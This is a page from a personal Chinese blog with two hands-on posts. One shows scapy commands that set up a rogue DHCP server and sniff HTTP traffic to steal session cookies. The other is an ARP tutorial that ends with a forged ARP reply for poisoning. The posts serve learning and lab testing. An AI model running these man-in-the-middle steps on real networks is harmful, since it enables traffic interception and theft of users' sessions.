<!doctype html>
<html class="theme-next   use-motion ">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>




  
    <link href='//fonts.lug.ustc.edu.cn/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext' rel='stylesheet' type='text/css'>
  



<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=0.4.5.2" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Reverland, Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="Reverland的行知阁" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/images/default_avatar.jpg?v=0.4.5.2" />






<meta name="description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">
<meta property="og:type" content="website">
<meta property="og:title" content="Reverland的行知阁">
<meta property="og:url" content="http://reverland.org/page/8/index.html">
<meta property="og:site_name" content="Reverland的行知阁">
<meta property="og:description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Reverland的行知阁">
<meta name="twitter:description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">



<script type="text/javascript" id="hexo.configuration">
  var CONFIG = {
    scheme: '',
    sidebar: 'post',
    motion: true
  };
</script>

  <title> Reverland的行知阁 </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  <!--[if lte IE 8]>
  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
           style='margin-left:auto;margin-right:auto;display: block;'/>
    </a>
  </div>
<![endif]-->
  






  <div class="container one-column 
   page-home 
">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Reverland的行知阁</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle">开放、分享、自由与进步</p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu ">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-th fa-fw"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-tags fa-fw"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-user fa-fw"></i> <br />
            
            关于
          </a>
        </li>
      

      
      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div id="content" class="content">
          
  <section id="posts" class="posts-expand">

    

    
    

    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/network/2014/03/07/play-dhcp/" itemprop="url">
                  Playing and Learning DHCP in Action
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-03-07T00:00:00+08:00" content="2014-03-07">
              2014-03-07
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/network/" itemprop="url" rel="index">
                    <span itemprop="name">network</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/network/2014/03/07/play-dhcp/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="network/2014/03/07/play-dhcp/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="实验准备">实验准备</h2><ul>
<li>scapy：用来伪造dhcp/dns服务器，抓包(调用tcpdump)</li>
<li>tcpdump/wireshark：来观察网络流量。</li>
<li>twisted来建立dns服务器</li>
<li>某个测试机器和某路由无线网络</li>
</ul>
<h2 id="一点DHCP协议基础">一点DHCP协议基础</h2><p>DHCP是，是干啥的呢？简单来说是为了自动化为网络中的主机配置各种配置，包括ip地址，网关，域名服务器等等。</p>
<p>有篇不错的<a href="http://jeffyyko.blog.51cto.com/28563/163168" target="_blank" rel="external">中文教程</a>带你回顾整个dhcp服务过程，然而，事情不总是这样的。比如linux和安卓一般默认就没有arping检查重复ip的过程。</p>
<h2 id="Rogue_DHCP_Server">Rogue DHCP Server</h2><p>流氓服务器，指非法在网络中提供dhcp服务的机器。由于dhcp服务没有认证过程，任何dhcp服务器都能为网络上的机器提供服务。实际上就是几个服务器竞争看谁反应快客户端就使用谁，这为中间人攻击提供了可能。</p>
<h2 id="一次中间人攻击">一次中间人攻击</h2><p>我们试着搭建一个流氓dhcp服务器来指向错误的网关和dns(即我们自己)。</p>
<p>本机的ip地址是<code>192.168.1.101</code>，这是无线路由中dhcp服务器分配的。为了让实验一定成功，最好干脆把无线路由的dhcp功能关掉，自己手动配置地址<code>192.168.1.101</code>，然后搭建个dhcp服务器。</p>
<p>首先，确认设置ip转发功能：</p>
<pre><code>gentoo ~ <span class="preprocessor"># echo <span class="number">1</span> &gt; /proc/sys/net/ipv4/ip_forward</span>
</code></pre><p>首先，用scapy搭建一个dhcp服务器，把网关指向自己。scapy中<code>DHCP_am</code>的设计就是把<code>nameserver</code>也指向网关，可参考源代码。</p>
<pre><code><span class="prompt">&gt;&gt;</span>&gt; dhcp_server= <span class="constant">DHCP_am</span>()
<span class="prompt">&gt;&gt;</span>&gt; dhcp_server.gw=<span class="string">'192.168.1.101'</span>
<span class="prompt">&gt;&gt;</span>&gt; dhcp_server()
</code></pre><p>监听观察，发现默认网关的dhcp服务器竟然给了一个<code>dhcpnak</code>：</p>
<pre><code> ~ ⮀ sudo tcpdump -<span class="tag">i</span> wlan0 port <span class="number">67</span> or port <span class="number">68</span> 
tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode
listening on wlan0, link-type EN10MB (Ethernet), capture size <span class="number">65535</span> bytes
<span class="number">23</span>:<span class="number">18</span>:<span class="number">55.634526</span> IP <span class="number">0.0</span>.<span class="number">0.0</span><span class="class">.bootpc</span> &gt; <span class="number">255.255</span>.<span class="number">255.255</span><span class="class">.bootps</span>: BOOTP/DHCP, Request from <span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span> (oui Unknown), length <span class="number">302</span>
<span class="number">23</span>:<span class="number">18</span>:<span class="number">55.681009</span> IP <span class="number">192.168</span>.<span class="number">1.101</span><span class="class">.bootps</span> &gt; <span class="number">192.168</span>.<span class="number">1.128</span><span class="class">.bootpc</span>: BOOTP/DHCP, Reply, length <span class="number">296</span>
<span class="number">23</span>:<span class="number">18</span>:<span class="number">55.688288</span> IP <span class="number">0.0</span>.<span class="number">0.0</span><span class="class">.bootpc</span> &gt; <span class="number">255.255</span>.<span class="number">255.255</span><span class="class">.bootps</span>: BOOTP/DHCP, Request from <span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span> (oui Unknown), length <span class="number">314</span>
<span class="number">23</span>:<span class="number">18</span>:<span class="number">55.781062</span> IP <span class="number">192.168</span>.<span class="number">1.101</span><span class="class">.bootps</span> &gt; <span class="number">192.168</span>.<span class="number">1.128</span><span class="class">.bootpc</span>: BOOTP/DHCP, Reply, length <span class="number">296</span>
<span class="number">23</span>:<span class="number">18</span>:<span class="number">56.124282</span> IP <span class="number">192.168</span>.<span class="number">1.1</span><span class="class">.bootps</span> &gt; <span class="number">255.255</span>.<span class="number">255.255</span><span class="class">.bootpc</span>: BOOTP/DHCP, Reply, length <span class="number">548</span>
</code></pre><p>用twisted建立一个DNS服务器[^1]：</p>
<pre><code><span class="comment">sudo</span> <span class="comment">twistd</span> <span class="literal">-</span><span class="comment">n</span> <span class="comment">dns</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">recursive</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">cache</span>
</code></pre><p>在scapy中开始中间人攻击(窃听)，比如窃听http头：</p>
<pre><code>pkts = sniff(filter=<span class="string">"(tcp port 80 and (((ip[2:2] - ((ip[0]&amp;0xf)&lt;&lt;2)) - ((tcp[12]&amp;0xf0)&gt;&gt;2)) != 0)) and host 192.168.1.128 and (not host 192.168.1.1)"</span>,iface=<span class="string">"wlan0"</span>, prn=lambda <span class="keyword">x</span>: <span class="keyword">x</span>.<span class="keyword">sprintf</span>(<span class="string">"{IP:<span class="variable">%IP</span>.src% -&gt; <span class="variable">%IP</span>.dst<span class="variable">%\</span>n}{Raw:<span class="variable">%Raw</span>.load<span class="variable">%\</span>n}"</span>))
<span class="number">192.168</span>.<span class="number">1.128</span> -&gt; <span class="number">123.125</span>.<span class="number">70.102</span>
<span class="string">'GET /tongji/anchor?type=webapp_pv&amp;t=1394205309005&amp;page=carousel HTTP/1.1\r\nHost: wk.baidu.com\r\nAccept-Encod此处略去具体信息'</span>
</code></pre><p>搞到cookie后尽情发挥吧，可以用temper data这种东西在火狐里试下。当然，cookie可以在各种地方比如requests啊selenium里啊使用。</p>
<p>完工。其实后来实验时无线路由dhcp服务器被选中了，然后我的rogue dhcp server就一直处于无用状态。</p>
<p>FIXME：可以尝试一个dhcprelease来试着解除租约，可能涉及xid或transaction ID这些东西的监听和伪造。也许会在查阅更多资料后尝试，也许。</p>
<p>Update：以下这个链接做了这些，不过，它怎么获得xid(transaction id)的不是很明白，要赶在dhcp client的dhcprequest发出之后dhcp server返回dhcpack之前向dhcp client注入dhcpnak，好像得在开始建立连接的时候就开始监听，获取transaction id，直接就伪装成dhcp服务器想客户端发送dhcpnak。</p>
<ul>
<li><a href="http://www.backtrack-linux.org/forums/showthread.php?t=25132" target="_blank" rel="external">http://www.backtrack-linux.org/forums/showthread.php?t=25132</a></li>
</ul>
<p>[^1]: 最开始我用scapy来建立dns服务器： <code>dns_spoof()</code>.关于用scapy做DNS转发服务器，参见PacketGeek上scapy的教程<a href="http://thepacketgeek.com/scapy-p-09-scapy-and-dns/" target="_blank" rel="external">Scapy and DNS</a></p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/network/2014/03/04/play-arp/" itemprop="url">
                  Playing and Learning ARP in Action
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-03-04T00:00:00+08:00" content="2014-03-04">
              2014-03-04
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/network/" itemprop="url" rel="index">
                    <span itemprop="name">network</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/network/2014/03/04/play-arp/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="network/2014/03/04/play-arp/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="实验准备">实验准备</h2><p>这是我的工具：</p>
<ul>
<li>一台linux机器，内核支持ip转发，arp代理。带无线网卡和有线网卡。比如一台笔记本电脑。</li>
<li>linux机器装好scapy，tcpdump</li>
<li>网线，不一定是双绞线，现代网卡都应该支持双向通信模式的转换。</li>
<li>一台windows台式机，带有线网卡和接口。</li>
</ul>
<h2 id="一点scapy的小基础">一点scapy的小基础</h2><p>scapy是一种基于python的包操作工具，在python上实现了一种DSL(领域特定语言)。定义一个包很简单。比如一个<code>Ether</code>：</p>
<pre><code><span class="function"><span class="title">Ether</span><span class="params">(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>)</span></span>
</code></pre><p>封包里的字段可以<code>ls</code>来查看：</p>
<pre><code><span class="function"><span class="title">ls</span><span class="params">(Ether)</span></span>
</code></pre><p>当我们想让一个Ethernet包封装一个IP包时，仅仅使用一个<code>/</code>:</p>
<pre><code>ip = <span class="function"><span class="title">Ether</span><span class="params">()</span></span>/<span class="function"><span class="title">IP</span><span class="params">()</span></span>
</code></pre><p>当我们想发包时，如果想在第三层上网络层以上发包：</p>
<pre><code><span class="function"><span class="title">send</span><span class="params">(ip)</span></span>
</code></pre><p>但你要发一个ARP包(在第二层上发包)的话，要用<code>srp</code>或<code>srp1</code>。</p>
<h2 id="arp如何工作">arp如何工作</h2><p>计算机仅仅知道ip地址是无法通信的，ip数据报在封装到数据链路层中时需要加上比如以太网报头，报头中应该含有数据链路层能理解的地址即MAC地址。ARP就是着么一种将IP转换成MAC地址的协议。</p>
<p>如下例子，当我们Ping一台机器时，如果该ip在arp缓存中有，就可以直接找到mac地址，如果没有，就会广播一个请求询问对应ip的mac地址。</p>
<pre><code>~/Work/project/arp-pos ⮀ sudo arp -d <span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span>
~/Work/project/arp-pos ⮀ ping -c <span class="number">1</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span>
PING <span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span> (<span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span>) <span class="number">56</span>(<span class="number">84</span>) <span class="keyword">bytes</span> <span class="operator">of</span> data.
<span class="number">64</span> <span class="keyword">bytes</span> <span class="built_in">from</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">64</span> <span class="built_in">time</span>=<span class="number">142</span> ms

<span class="comment">--- 192.168.1.113 ping statistics ---</span>
<span class="number">1</span> packets transmitted, <span class="number">1</span> received, <span class="number">0</span>% packet loss, <span class="built_in">time</span> <span class="number">0</span>ms
rtt <span class="built_in">min</span>/<span class="built_in">avg</span>/<span class="built_in">max</span>/mdev = <span class="number">142.484</span>/<span class="number">142.484</span>/<span class="number">142.484</span>/<span class="number">0.000</span> ms

 ~ ⮀ sudo tcpdump -vv -eqtnni wlan0 arp
tcpdump: listening <span class="command"><span class="keyword">on</span> <span class="title">wlan0</span>, <span class="title">link-type</span> <span class="title">EN10MB</span> (<span class="title">Ethernet</span>), <span class="title">capture</span> <span class="title">size</span> <span class="title">65535</span> <span class="title">bytes</span></span>
<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> &gt; ff:ff:ff:ff:ff:ff, ARP, <span class="built_in">length</span> <span class="number">42</span>: Ethernet (<span class="built_in">len</span> <span class="number">6</span>), IPv4 (<span class="built_in">len</span> <span class="number">4</span>), Request who-has <span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span> tell <span class="number">192.168</span><span class="number">.1</span><span class="number">.106</span>, <span class="built_in">length</span> <span class="number">28</span>
<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span> &gt; <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>, ARP, <span class="built_in">length</span> <span class="number">42</span>: Ethernet (<span class="built_in">len</span> <span class="number">6</span>), IPv4 (<span class="built_in">len</span> <span class="number">4</span>), Reply <span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span> is-<span class="keyword">at</span> <span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>, <span class="built_in">length</span> <span class="number">28</span>
</code></pre><h2 id="抓包观察">抓包观察</h2><p>让我们看看机器获取IP的过程。这里我们用tcpdump，你可以在任何linux发行版的源里找到它。当然，也可以用wireshark。</p>
<pre><code> ~ ⮀ sudo tcpdump -e -i wlan0 port bootps or port bootpc or arp
tcpdump: WARNING: wlan0: no IPv4 address assigned
tcpdump: verbose output suppressed, <span class="operator"><span class="keyword">use</span> -v <span class="keyword">or</span> -vv <span class="keyword">for</span> <span class="keyword">full</span> protocol <span class="keyword">decode</span>
listening <span class="keyword">on</span> wlan0, <span class="keyword">link</span>-<span class="keyword">type</span> EN10MB (Ethernet), capture <span class="keyword">size</span> <span class="number">65535</span> <span class="keyword">bytes</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">19.202074</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>) &gt; Broadcast, ethertype IPv4 (<span class="number">0x0800</span>), <span class="keyword">length</span> <span class="number">371</span>: <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>.bootpc &gt; <span class="number">255.255</span><span class="number">.255</span><span class="number">.255</span>.bootps: BOOTP/DHCP, Request <span class="keyword">from</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>), <span class="keyword">length</span> <span class="number">329</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">19.277875</span> ec:<span class="number">88</span>:<span class="number">8</span><span class="keyword">f</span>:b4:d6:<span class="number">68</span> (oui <span class="keyword">Unknown</span>) &gt; <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>), ethertype IPv4 (<span class="number">0x0800</span>), <span class="keyword">length</span> <span class="number">590</span>: <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>.bootps &gt; <span class="number">192.168</span><span class="number">.1</span><span class="number">.101</span>.bootpc: BOOTP/DHCP, Reply, <span class="keyword">length</span> <span class="number">548</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">19.352068</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>) &gt; Broadcast, ethertype ARP (<span class="number">0x0806</span>), <span class="keyword">length</span> <span class="number">42</span>: Request who-has <span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span> tell <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>, <span class="keyword">length</span> <span class="number">28</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">20.720541</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>) &gt; Broadcast, ethertype ARP (<span class="number">0x0806</span>), <span class="keyword">length</span> <span class="number">42</span>: Request who-has <span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span> tell <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>, <span class="keyword">length</span> <span class="number">28</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">22.155087</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>) &gt; Broadcast, ethertype ARP (<span class="number">0x0806</span>), <span class="keyword">length</span> <span class="number">42</span>: Request who-has <span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span> tell <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>, <span class="keyword">length</span> <span class="number">28</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">24.232076</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>) &gt; Broadcast, ethertype ARP (<span class="number">0x0806</span>), <span class="keyword">length</span> <span class="number">42</span>: Request who-has <span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span> tell <span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span>, <span class="keyword">length</span> <span class="number">28</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">26.234201</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>) &gt; Broadcast, ethertype ARP (<span class="number">0x0806</span>), <span class="keyword">length</span> <span class="number">42</span>: Request who-has <span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span> tell <span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span>, <span class="keyword">length</span> <span class="number">28</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">27.502047</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>) &gt; Broadcast, ethertype ARP (<span class="number">0x0806</span>), <span class="keyword">length</span> <span class="number">42</span>: Request who-has <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> tell <span class="number">192.168</span><span class="number">.1</span><span class="number">.101</span>, <span class="keyword">length</span> <span class="number">28</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">27.514492</span> ec:<span class="number">88</span>:<span class="number">8</span><span class="keyword">f</span>:b4:d6:<span class="number">68</span> (oui <span class="keyword">Unknown</span>) &gt; <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>), ethertype ARP (<span class="number">0x0806</span>), <span class="keyword">length</span> <span class="number">42</span>: Reply <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> <span class="keyword">is</span>-<span class="keyword">at</span> ec:<span class="number">88</span>:<span class="number">8</span><span class="keyword">f</span>:b4:d6:<span class="number">68</span> (oui <span class="keyword">Unknown</span>), <span class="keyword">length</span> <span class="number">28</span></span>
</code></pre><p>可以看到，先是dhcp的过程，下次我们再讲。紧接着我们的机器发出一个ARP探针(Probe)，哦，发了好几次来确认没有机器使用<code>192.168.1.1</code>，于是接着发了两个announcement宣告拥有了这个ip。接着询问<code>192.168.1.1</code>的MAC地址并收到来自<code>192.168.1.1</code>的回复。</p>
<h2 id="一个广播的ARP请求">一个广播的ARP请求</h2><p>为了实验正确，我们先删除arp缓存内容：</p>
<pre><code>~/Work/project/arp ⮀ sudo arp -d <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>
~/Work/project/arp ⮀ sudo arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
  <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>                    (incomplete)                              eth0
</code></pre><p>首先，我们作为<code>10.210.96.200</code>，想知道<code>10.210.96.193</code>的MAC地址，我们广播一个ARP请求：</p>
<pre><code>我是<span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span>,我的MAC地址是<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>,我想知道<span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>的IP地址是什么。
</code></pre><p>让我们先探索下ARP包的结构。</p>
<pre><code>&gt;&gt;&gt; ls(ARP)
<span class="string">hwtype     :</span> XShortField          = (<span class="number">1</span>)
<span class="string">ptype      :</span> XShortEnumField      = (<span class="number">2048</span>)
<span class="string">hwlen      :</span> ByteField            = (<span class="number">6</span>)
<span class="string">plen       :</span> ByteField            = (<span class="number">4</span>)
<span class="string">op         :</span> ShortEnumField       = (<span class="number">1</span>)
<span class="string">hwsrc      :</span> ARPSourceMACField    = (None)
<span class="string">psrc       :</span> SourceIPField        = (None)
<span class="string">hwdst      :</span> MACField             = (<span class="string">'00:00:00:00:00:00'</span>)
<span class="string">pdst       :</span> IPField              = (<span class="string">'0.0.0.0'</span>)
</code></pre><p>参见<a href="http://en.wikipedia.org/wiki/Address_Resolution_Protocol#Packet_structure" target="_blank" rel="external">ARP协议封包结构</a></p>
<p>首先我们构造一个ARP请求。该请求工作在Ethernet上(<code>0x0001</code>)，协议类型是IPv4(<code>0x0800</code>), 是一个请求(<code>0x0001</code>或<code>who-has</code>)，发送者的MAC地址是<code>11:11:11:11:11:11</code>, 发送者的协议地址是<code>10.210.96.200</code>，想要知道MAC地址的协议地址是<code>10.210.96.193</code>。根据以太网包字段，该消息通过广播发送。</p>
<pre><code>arp_request = <span class="function"><span class="title">Ether</span><span class="params">(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>)</span></span>/<span class="function"><span class="title">ARP</span><span class="params">(hwtype=<span class="number">0</span>x0001,ptype=<span class="number">0</span>x0800,op=<span class="number">0</span>x0001,hwsrc=<span class="string">'11:11:11:11:11:11'</span>, psrc=<span class="string">'10.210.96.200'</span>, pdst=<span class="string">'10.210.96.193'</span>)</span></span>
</code></pre><p>scapy会自动为我们设置<code>Ether</code>的某些字段，所以我们不用都指定。</p>
<pre><code>&gt;&gt;&gt; arp_request.show()
<span class="preprocessor">###[ Ethernet ]###</span>
  dst= ff:ff:ff:ff:ff:ff
  src= <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>
  type= <span class="number">0x806</span>
<span class="preprocessor">###[ ARP ]###</span>
     hwtype= <span class="number">0x1</span>
     ptype= <span class="number">0x800</span>
     hwlen= <span class="number">6</span>
     plen= <span class="number">4</span>
     op= who-has
     hwsrc= <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>
     psrc= <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span>
     hwdst= <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>
     pdst= <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>
</code></pre><p>紧接着发送它：</p>
<pre><code>&gt;&gt;&gt; recv = srp(arp_request)
Begin emission:
Finished to send <span class="number">1</span> packets.
*
Received <span class="number">1</span> packets, got <span class="number">1</span> answers, remaining <span class="number">0</span> packets
&gt;&gt;&gt; recv
(&lt;Results: TCP:<span class="number">0</span> UDP:<span class="number">0</span> ICMP:<span class="number">0</span> Other:<span class="number">1</span>&gt;, &lt;Unanswered: TCP:<span class="number">0</span> UDP:<span class="number">0</span> ICMP:<span class="number">0</span> Other:<span class="number">0</span>&gt;)
&gt;&gt;&gt; recv[<span class="number">0</span>].show()
<span class="number">0000</span> Ether / ARP who has <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span> says <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> ==&gt; Ether / ARP is at <span class="number">3</span>c:e5:a6:d2:<span class="number">39</span>:ad says <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span> / Padding
</code></pre><p>可见我们得到了它的MAC地址。检查ARP缓存：</p>
<pre><code>~/Work/project/arp ⮀ sudo arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
<span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>            ether   <span class="number">3</span>c:e5:a6:d2:<span class="number">39</span>:ad   C                     eth0
</code></pre><p>Bingo!</p>
<h2 id="一个ARP应答">一个ARP应答</h2><p>首先要设置静态IP。将一台win7机器设置为<code>172.16.0.17</code>.</p>
<p>接着我们要发一个不请自答的ARP reply，这一技术常用来进行ARP Poison。</p>
<pre><code>&gt;&gt;&gt; arp_reply = <span class="function"><span class="title">Ether</span><span class="params">(src=<span class="string">'11:11:11:11:11:11'</span>, dst=<span class="string">'C8:1F:66:05:E2:6A'</span>)</span></span>/<span class="function"><span class="title">ARP</span><span class="params">(hwtype=<span class="number">0</span>x0001,ptype=<span class="number">0</span>x0800,op=<span class="number">0</span>x0002,hwsrc=<span class="string">'11:11:11:11:11:11'</span>, hwdst=<span class="string">'C8:1F:66:05:E2:6A'</span>, psrc=<span class="string">'172.16.0.28'</span>, pdst=<span class="string">'172.16.0.17'</span>)</span></span>
recv = <span class="function"><span class="title">srp</span><span class="params">(arp_reply, timeout=<span class="number">1</span>, iface=<span class="string">'eth0'</span>)</span></span>
</code></pre><p>查看我们的监听：</p>
